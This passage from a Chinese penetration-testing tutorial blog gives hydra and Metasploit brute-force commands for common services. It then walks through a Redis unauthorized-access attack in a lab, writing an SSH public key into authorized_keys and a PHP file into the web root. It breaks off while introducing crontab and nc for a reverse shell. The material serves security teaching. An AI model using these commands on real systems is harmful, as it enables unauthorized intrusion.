plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfuse auxiliary/scanner/telnet/telnet_login</span><br></pre></td></tr></table></figure><p>超级弱口令工具和 Hydra 爆破 Telnet 不太行，尽量使用 MSF 爆破 Telnet 爆破</p><h3 id="爆破-445-SMB"><a href="#爆破-445-SMB" class="headerlink" title="爆破 445 SMB"></a>爆破 445 SMB</h3><p>SMB(Server Message Block) Windows协议族，用于文件和打印共享服务。</p><blockquote><p>SMB 和 RDP 用户都是一样的<br>能爆破SMB就不爆破RDP<br>另外 SMB 爆破还与防火墙是否关闭有关系，总的来说 SMB 爆破首选 MSF</p></blockquote><p>hydra 指令：</p><p><code>hydra -L user.txt -P password.txt smb://127.0.0.1</code></p><p>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br></pre></td></tr></table></figure><h3 id="爆破-Samba"><a href="#爆破-Samba" class="headerlink" title="爆破 Samba"></a>爆破 Samba</h3><p>Samba 是种用来让 UNIX 系列的操作系统与微软 Windows 操作系统的 SMB 网络协议做链接的自由软件。</p><h3 id="爆破-1433-MSSQL"><a href="#爆破-1433-MSSQL" class="headerlink" title="爆破 1433 MSSQL"></a>爆破 1433 MSSQL</h3><p>MSSQL 是指微软的 SQLServer 数据库，默认端口为 1433 ，默认最高权限用户为 sa ，拿到 sa 用户权限的话，基本可以顺利提权拿到系统权限。</p><p>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br></pre></td></tr></table></figure><h3 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。默认端口为 1521 端口，和其他数据库不同的是，爆破前得先爆破对应的 SID，不过 SID 很多都是默认的，可以使用 MSF 来进行爆破。</p><p>Metasploit 爆破 SID<br>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/sid_brut</span><br></pre></td></tr></table></figure><p>Metasploit 爆破 Oracle<br>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br></pre></td></tr></table></figure><h3 id="爆破-3306-MySQL"><a href="#爆破-3306-MySQL" class="headerlink" title="爆破 3306 MySQL"></a>爆破 3306 MySQL</h3><p>MySQL 是一个关系型数据库管理系统，默认端口为 3306</p><p>爆破前检测是否开启数据库外连，不要做无意义的爆破。</p><p>hydra 指令：</p><p><code>hydra -L user.txt -P password.txt mysql://127.0.0.1</code></p><p>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br></pre></td></tr></table></figure><h3 id="爆破-3389-RDP"><a href="#爆破-3389-RDP" class="headerlink" title="爆破 3389 RDP"></a>爆破 3389 RDP</h3><p>远程桌面协议 RDP （Remote Display Protocol ）是 Windows 的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到 Windows 计算机，默认端口为 3389</p><p>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般 Windows 服务器陌默认账户为 administrator。此外如果对方服务器开启了 SMB 445 端口的话尽量优先爆破 SMB，因为 RDP 协议比较脆弱，经不起高速的爆破。</p><h3 id="爆破-5432-PostgreSQL"><a href="#爆破-5432-PostgreSQL" class="headerlink" title="爆破 5432 PostgreSQL"></a>爆破 5432 PostgreSQL</h3><p>PostgreSQL 是一种对象-关系型数据库管理系统，默认端口为 5432</p><p>可以直接使用超级弱口令工具爆破也可以使用 Metasploit 来进行爆破。</p><p>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br></pre></td></tr></table></figure><h3 id="爆破-6379-Redis"><a href="#爆破-6379-Redis" class="headerlink" title="爆破 6379 Redis"></a>爆破 6379 Redis</h3><p>Redis 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。默认端口为 6379</p><p>可以直接使用超级弱口令工具爆破也可以使用 Metasploit。</p><p>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/redis/redis_login</span><br></pre></td></tr></table></figure><h3 id="爆破-8080-Tomcat"><a href="#爆破-8080-Tomcat" class="headerlink" title="爆破 8080 Tomcat"></a>爆破 8080 Tomcat</h3><p>Tomcat 是由 Apache 软件基金会属下Jakarta项目开发的 Servlet 容器，默认端口为 8080</p><p>可以使用 Burp 的 Basic 认证爆破也可以直接使用 MSF 的模块来进行爆破。Tomcat口令是用户名在<code>/conf/tomcat-users.xml</code>自定义配置的，容易出现弱口令，Tomcat口令泄露的话 很容易被getshell 所以需要加固口令。</p><p>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br></pre></td></tr></table></figure><h3 id="爆破-27017-MongoDB"><a href="#爆破-27017-MongoDB" class="headerlink" title="爆破 27017 MongoDB"></a>爆破 27017 MongoDB</h3><p>MongoDB 是一个基于分布式文件存储的数据库，当配置成无验证时，存在未授权访问。默认端口为 27017</p><p>可以直接使用超级弱口令工具爆破也可以使用 Metasploit。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mongodb/mongodb_login</span><br></pre></td></tr></table></figure><h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><p>未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。</p><p>未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。</p><h2 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h2><p>Redis 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>Redis 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行操作。</p><h3 id="Windows-安装"><a href="#Windows-安装" class="headerlink" title="Windows 安装"></a>Windows 安装</h3><p>下载地址：<a href="https://github.com/microsoftarchive/redis/releases" target="_blank" rel="noopener">https://github.com/microsoftarchive/redis/releases</a></p><p>打开一个 cmd 窗口 使用命令切换到 Redis 运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server.exe redis.windows.conf</span><br></pre></td></tr></table></figure><p>后面的那个 redis.windows.conf 可以省略，如果省略，会启用默认的</p><h4 id="一些基本的交互命令"><a href="#一些基本的交互命令" class="headerlink" title="一些基本的交互命令"></a>一些基本的交互命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 切换到 Redis 目录下运行：</span><br><span class="line">redis-cli.exe -h 127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line"># 查看Redis的相关信息</span><br><span class="line">127.0.0.1:6379&gt;info</span><br><span class="line"></span><br><span class="line"># SET 设置键值对测试</span><br><span class="line">127.0.0.1:6379&gt; SET X &quot;Tomorrow is a another day&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET X</span><br><span class="line">&quot;Tomorrow is a another day&quot;</span><br></pre></td></tr></table></figure><h3 id="Linux-编译安装"><a href="#Linux-编译安装" class="headerlink" title="Linux 编译安装"></a>Linux 编译安装</h3><p>下载地址：<a href="https://redis.io/download" target="_blank" rel="noopener">https://redis.io/download</a></p><p><img src="http://qiniuyun.lintstar.top/image-20200802235015381.png" alt="image-20200802235015381"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 下载Redis</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"></span><br><span class="line"># 解压</span><br><span class="line">tar zxvf redis-5.0.5..tar.gz</span><br><span class="line"></span><br><span class="line"># 到src目录下</span><br><span class="line">cd redis-5.0.5/src</span><br><span class="line"></span><br><span class="line"># 编译</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编译成功如下：</p><p><img src="http://qiniuyun.lintstar.top/20200803094635.png" alt="20200803094635"></p><p>make 完后 Redis 的 src 目录下会出现编译后的 Redis 服务程序 Redis-server ，还有用于测试的客户端程序 Redis-cli：</p><p>下面启动 Redis 服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">./redis-server</span><br></pre></td></tr></table></figure><p><code>注意这种方式启动 Redis 使用的是默认配置。也可以通过启动参数告诉 Redis 使用指定配置文件使用下面命令启动。redis.conf 是一个默认的配置文件。我们可以根据需要使用自己的配置文件。</code></p><p>启动 Redis 服务进程后，就可以使用测试客户端程序 redis-cli 和 Redis 服务交互了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali-linux:~/redis-5.0.5/src# ./redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; SET y &quot;Linux Redis is Running&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET y</span><br><span class="line">&quot;Linux Redis is Running&quot;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200803094831.png" alt="20200803094831"></p><h3 id="Linux-apt-安装"><a href="#Linux-apt-安装" class="headerlink" title="Linux apt 安装"></a>Linux apt 安装</h3><p>在 Ubuntu 系统安装 Redis 可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新源</span></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装redis</span></span><br><span class="line">$ sudo apt-get install redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动redis</span></span><br><span class="line">$ redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试连接</span></span><br><span class="line">$ redis-cli</span><br></pre></td></tr></table></figure><h3 id="未授权访问修改公私钥"><a href="#未授权访问修改公私钥" class="headerlink" title="未授权访问修改公私钥"></a>未授权访问修改公私钥</h3><p>Redis 未授权访问在4.x/5.0.5以前版本下，我们可以使用 master/slave 模式加载远程模块，通过动态链接库的方式执行任意命令。</p><h4 id="安装配置SSH"><a href="#安装配置SSH" class="headerlink" title="安装配置SSH"></a>安装配置SSH</h4><p>首先受害者Redis的服务器配置好公司钥登录的情况下可以直接通过修改秘钥来直接登录到服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新源</span></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装openssh-server</span></span><br><span class="line">apt install openssh-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许root远程登陆</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PermitRootLogin yes"</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启SSH</span></span><br><span class="line">systemctl start sshd</span><br></pre></td></tr></table></figure><h4 id="配置公私钥"><a href="#配置公私钥" class="headerlink" title="配置公私钥"></a>配置公私钥</h4><p>ssh 公私钥 <code>\n\n\n 换三行不然公私钥会乱码</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成公私钥</span></span><br><span class="line">ssh-keygen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 到ssh公私钥放的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将公钥的内容拷贝到authorized_keys文件中</span></span><br><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭密码登陆</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PasswordAuthentication no"</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启ssh</span></span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure><p>将<code>id-rsa</code>拷贝到自己的机器上，用于连接SSH使用。</p><p>客户端尝试公私钥登录:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将拷贝下来的私钥设置600权限</span></span><br><span class="line">chmod 600 ~/Downloads/id_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥登陆</span></span><br><span class="line">ssh -i ~/Downloads/id_rsa root@10.211.55.4</span><br></pre></td></tr></table></figure><h4 id="模拟真实攻击"><a href="#模拟真实攻击" class="headerlink" title="模拟真实攻击"></a>模拟真实攻击</h4><table><thead><tr><th>攻击者</th><th>IP地址</th></tr></thead><tbody><tr><td>macOS 本机</td><td>10.211.55.2</td></tr><tr><td>Kali Linux 虚拟机</td><td>10.211.55.4</td></tr></tbody></table><p>Kali Linux虚拟机配置下Redis配置文件关闭 IP地址绑定：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/root/redis-5.0.5</span><br><span class="line">$ vim redis.conf</span><br></pre></td></tr></table></figure><p>去掉ip绑定，允许除本地外的主机远程登录redis服务，需要注释掉如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure><p>关掉保护模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure><p>然后重启下Redis服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20190930070624566.png" alt="image-20190930070624566"></p><p>首先<strong>攻击者</strong>先本地生成一对公私钥：</p><p><img src="http://qiniuyun.lintstar.top/20200809021235.png" alt="20200809021235"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 连接redis</span></span><br><span class="line">$ redis-cli -h 10.211.55.4 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前路径</span></span><br><span class="line">10.211.55.4:6379&gt; config get dir</span><br><span class="line">1) <span class="string">"dir"</span></span><br><span class="line">2) <span class="string">"/root/redis-5.0.5"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前要操作的文件</span></span><br><span class="line">10.211.55.4:6379&gt; config get dbfilename</span><br><span class="line">1) <span class="string">"dbfilename"</span></span><br><span class="line">2) <span class="string">"dump.rdb"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的文件</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看设置好的路径</span></span><br><span class="line">10.211.55.4:6379&gt; config get dir</span><br><span class="line">1) <span class="string">"dir"</span></span><br><span class="line">2) <span class="string">"/root/.ssh"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查案设置好的文件</span></span><br><span class="line">10.211.55.4:6379&gt; config get dbfilename</span><br><span class="line">1) <span class="string">"dbfilename"</span></span><br><span class="line">2) <span class="string">"authorized_keys"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入公钥的值</span></span><br><span class="line">10.211.55.4:6379&gt; <span class="built_in">set</span> x <span class="string">"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDq1+O0Ht8S9iAdLE1btr0A14yR5dqS3mO9cWm5gasdYh+ZT31yZ+FoFo4IRZt+T7oliRgKO4krhmARpFmAj5B0C6Tv6N6js4lvdGBlV1AhPCnp2f+3mLZ+t97vUhF7pXXxdnu8759PJZ5IwjfVsRiCgnFY3p3eDY4kCl5nVqQm71MyaOX7FZwzsNvS3ZjP3tiy0drnVnr2QSrtKWSpuzxXApPupVS7HkcyuE9zbbckuo3cOMhFk8N9R0eIokALcXlvTXjqUwwQvU79F4D4YhFeDDovZp43mggSq4Oxsy/soL79XrIv2Hpv0cUUAEp1RDKyF3V1MH1O7fdyb63xd6R5 sqlsec@com\n\n\n"</span></span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将公钥的值保存到要操作的文件</span></span><br><span class="line">10.211.55.4:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>SSH 登录验证：</p><p><img src="http://qiniuyun.lintstar.top/20200809021341.png" alt="20200809021341"></p><h2 id="未授权访问写入Webshell"><a href="#未授权访问写入Webshell" class="headerlink" title="未授权访问写入Webshell"></a>未授权访问写入Webshell</h2><p>原理和写入SSH一样，首先 Kali Linux 开启 Apache：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 Apache</span></span><br><span class="line">systemctl start apache2</span><br><span class="line">systemctl status apache2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 info.php 测试</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span> &gt; /var/www/html/info.php</span><br></pre></td></tr></table></figure><p>然后浏览器访问：<a href="http://127.0.0.1/info.php" target="_blank" rel="noopener">http://127.0.0.1/info.php</a> 查看是否生效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 操作目录</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 操作文件</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置数据</span></span><br><span class="line">10.211.55.4:6379&gt; <span class="built_in">set</span> x <span class="string">"&lt;?php phpinfo();?&gt;"</span></span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入数据</span></span><br><span class="line">10.211.55.4:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h2 id="未授权访问弹-shell"><a href="#未授权访问弹-shell" class="headerlink" title="未授权访问弹 shell"></a>未授权访问弹 shell</h2><h3 id="crontab-定时任务"><a href="#crontab-定时任务" class="headerlink" title="crontab 定时任务"></a>crontab 定时任务</h3><p>Linux 下使用原生的 crontab 命令实现定时任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看定时任务</span></span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑定时任务</span></span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>编辑定时任务，一行一个任务，填写的内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分 时 日 月 星期 要运行的命令</span></span><br><span class="line">30 9 * * * /usr/bin/python3 /root/code/t00ls/TuBi.py&gt;&amp;1</span><br></pre></td></tr></table></figure><p>表示每天 9:30 自动运行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3 /root/code/t00ls/TuBi.py</span><br></pre></td></tr></table></figure><p>这样看起来是不是很简单呢，如果语法没有问题的话，会得到如下提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab: installing new crontab</span><br></pre></td></tr></table></figure><p>这表示新建定时任务成功。</p><h4 id="crontab-实例"><a href="#crontab-实例" class="headerlink" title="crontab 实例"></a>crontab 实例</h4><p><strong>实例1：每 1 分钟执行一次 myCommand</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * myCommand</span><br></pre></td></tr></table></figure><p><strong>实例2：每小时的第 3 和第 15 分钟执行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 * * * * myCommand</span><br></pre></td></tr></table></figure><p><strong>实例3：在上午 8 点到 11 点的第 3 和第 15 分钟执行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 8-11 * * * myCommand</span><br></pre></td></tr></table></figure><p><strong>实例4：每隔两天的上午 8 点到 11 点的第 3 和第 15 分钟执行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 8-11 */2  *  * myCommand</span><br></pre></td></tr></table></figure><p><strong>实例5：每周一上午 8 点到 11 点的第 3 和第 15 分钟执行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 8-11 * * 1 myCommand</span><br></pre></td></tr></table></figure><p><strong>实例6：每晚的21:30重启smb</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 21 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><p><strong>实例7：每月1、10、22日的 4 : 45 重启smb</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45 4 1,10,22 * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><p><strong>实例8：每周六、周日的 1 : 10 重启 smb</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 1 * * 6,0 /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><p><strong>实例9：每天 18 : 00 至 23 : 00 之间每隔 30 分钟重启smb</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0,30 18-23 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><p><strong>实例10：每星期六的晚上 23 : 00 重启smb</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23 * * 6 /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><p><strong>实例11：每一小时重启smb</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* */1 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><p><strong>实例12：晚上11点到早上7点之间，每隔一小时重启smb</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23-7 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><p><strong>关于 /etc/crontab 及 /var/spool/cron/crontabs/$USER 中定义的定时任务</strong></p><p>/etc/crontab 只有 root 用户可以使用，使用时需root权限，而且<strong>必须指定运行用户</strong>，才会执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * root myCommand</span><br></pre></td></tr></table></figure><p>/var/spool/cron/$USER 所有用户都可以使用，可以使用 crontab -u username -e 命令来直接编辑这个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * myCommand</span><br></pre></td></tr></table></figure><p>Kali 的 shell 下有点问题，Ubuntu 16.10 已将先前默认的 bashshell 更换为了 dashshell。Debian 和 Ubuntu中，/bin/sh 默认已经指向 dash，这是一个不同于 bash 的 shell，它主要是为了执行脚本而出现，而不是交互，它速度更快，但功能相比bash要少很多，语法严格遵守POSIX标准。因为缺少了binbash的交互特性，所以kali中弹不回shell可以得到很好的解释了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -fs /bin/bash /bin/sh</span><br></pre></td></tr></table></figure><h4 id="nc-命令教程"><a href="#nc-命令教程" class="headerlink" title="nc 命令教程"></a>nc 命令教程</h4><p><a href="https://www.sqlsec.com/2019/10/nc.html" target="_blank" rel="noopener">https://www.sqlsec.com/2019/10/nc.html</a></p><p>nc 被誉为网络安全界的瑞士军刀，一个简单而有用的工具，透过使用 TCP 或 UDP 协议的网络连接去读写数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;认证技术&quot;&gt;&lt;a href=&quot;#认证技术&quot; class=&quot;headerlink&quot; title=&quot;认证技术&quot;&gt;&lt;/a&gt;认证技术&lt;/h1&gt;&lt;p&gt;身份认证技术是用于在计算机网络中&lt;strong&gt;确认操作者身份&lt;/strong&gt;的一种有效的解决方法。 计算机网络世界中一切
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
